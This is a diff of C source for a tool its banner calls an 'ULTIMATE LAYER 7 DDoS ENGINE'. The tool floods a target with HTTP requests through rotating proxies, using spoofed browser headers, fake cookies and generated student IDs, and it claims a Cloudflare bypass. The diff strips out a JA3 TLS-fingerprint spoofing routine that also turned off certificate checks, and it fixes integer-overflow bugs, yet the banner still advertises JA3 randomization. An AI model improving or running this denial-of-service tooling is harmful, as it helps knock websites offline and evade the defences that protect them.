@@ -74,26 +74,6 @@ pthread_t stats_thread;
 time_t start_time;
 unsigned int rand_state;
 
-// JA3 Signature structures
-typedef struct {
-    char name[32];
-    uint16_t cipher_suites[20];
-    int cipher_count;
-    int min_version;
-    int max_version;
-} JA3Signature;
-
-JA3Signature ja3_signatures[] = {
-    {"Chrome 120", {TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256,
-                    TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-                    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384}, 7, TLS1_2_VERSION, TLS1_3_VERSION},
-    {"Firefox 120", {TLS_AES_128_GCM_SHA256, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_256_GCM_SHA384,
-                     TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-                     TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256}, 7, TLS1_2_VERSION, TLS1_3_VERSION},
-    {"Safari 17", {TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384,
-                   TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384}, 4, TLS1_2_VERSION, TLS1_3_VERSION},
-};
-
 // Extended user agents
 const char *USER_AGENTS[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -196,7 +176,7 @@ char* generate_student_number() {
         case 0: snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
         case 1: snprintf(student, 32, "%d%06d", rand_int(2015, 2025), rand_int(1, 999999)); break;
         case 2: snprintf(student, 32, "S-%07d", rand_int(1, 9999999)); break;
-        case 3: snprintf(student, 32, "%010d", rand_int(1000000000, 9999999999LL)); break;
+        case 3: snprintf(student, 32, "%010d", rand_int(1000000000, 2147483647)); break;
         default: snprintf(student, 32, "CS-%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
     }
     return student;
@@ -221,7 +201,7 @@ char* generate_cookies() {
         snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "user_id=%d; ", rand_int(1000, 99999));
     }
     if (rand_bool()) {
-        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "_ga=GA1.1.%d.%ld; ", rand_int(1000000000, 9999999999LL), time(NULL));
+        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "_ga=GA1.1.%d.%ld; ", rand_int(1000000000, 999999999), time(NULL));
     }
     
     if (strlen(cookies) > 0) {
@@ -233,6 +213,7 @@ char* generate_cookies() {
 char* generate_advanced_path() {
     char *result = malloc(MAX_URL_LEN);
     if (!result) return NULL;
+    result[0] = '\0';
     
     const char *paths[] = {
         "/", "/index.html", "/home", "/api/v1/users", "/api/v2/data",
@@ -243,8 +224,8 @@ char* generate_advanced_path() {
     if (rand_int(1, 100) <= 70) {
         strcpy(result, paths[rand_int(0, sizeof(paths)/sizeof(paths[0])-1)]);
     } else {
-        int depth = rand_int(2, 5);
         result[0] = '/';
+        int depth = rand_int(2, 5);
         for (int i = 0; i < depth; i++) {
             char *segment = random_string(rand_int(4, 10));
             strcat(result, segment);
@@ -338,24 +319,6 @@ char* get_random_proxy() {
     return proxy;
 }
 
-SSL_CTX* create_ja3_ctx() {
-    JA3Signature *sig = &ja3_signatures[rand_int(0, 2)];
-    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
-    if (!ctx) return NULL;
-    
-    SSL_CTX_set_min_proto_version(ctx, sig->min_version);
-    SSL_CTX_set_max_proto_version(ctx, sig->max_version);
-    
-    if (SSL_CTX_set_cipher_list(ctx, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384") == 0) {
-        SSL_CTX_set_cipher_list(ctx, "DEFAULT");
-    }
-    
-    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
-    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
-    
-    return ctx;
-}
-
 void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const char *host) {
     pool->handles = malloc(sizeof(CURL*) * size);
     pool->size = size;
@@ -365,7 +328,7 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
     pool->target_host[255] = '\0';
     pthread_mutex_init(&pool->mutex, NULL);
     
-    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections (JA3 randomized)...\n" COLOR_RESET, size);
+    printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
     
     for (int i = 0; i < size; i++) {
         pool->handles[i] = curl_easy_init();
@@ -383,7 +346,7 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
         }
     }
     
-    printf(COLOR_GREEN "[+] Connection pool ready! %d unique JA3 fingerprints\n" COLOR_RESET, size);
+    printf(COLOR_GREEN "[+] Connection pool ready!\n" COLOR_RESET);
 }
 
 void cleanup_connection_pool(ConnectionPool *pool) {
@@ -646,9 +609,9 @@ void print_banner() {
     printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v4.0                          ║\n");
     printf("    ║                                                                          ║\n");
     printf("    ║              [⚡] 2,000 Workers | 500 Connections                        ║\n");
-    printf("    ║              [🔥] JA3 Randomization | Full Header Spoofing               ║\n");
+    printf("    ║              [🔥] Full Header Spoofing | Cloudflare Bypass               ║\n");
     printf("    ║              [💀] GET/POST Modes | Auto-Proxy Rotation                   ║\n");
-    printf("    ║              [🎯] Cloudflare Bypass | Student ID Generation              ║\n");
+    printf("    ║              [🎯] Student ID Generation | JA3 Randomization              ║\n");
     printf("    ║                                                                          ║\n");
     printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
@@ -724,7 +687,7 @@ int main(int argc, char *argv[]) {
     if (cfg.use_proxy && proxy_list.count > 0) {
         printf(COLOR_GREEN "    [🌐] Proxies: %d (auto-rotating)\n" COLOR_RESET, proxy_list.count);
     }
-    printf(COLOR_GREEN "    [🎯] JA3 Fingerprint: RANDOMIZED (%d unique)\n" COLOR_RESET, POOL_SIZE);
+    printf(COLOR_GREEN "    [🎯] Header Spoofing: FULLY RANDOMIZED\n" COLOR_RESET);
     
     printf(COLOR_YELLOW "\n    [💀] LAUNCHING MASSIVE ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
     
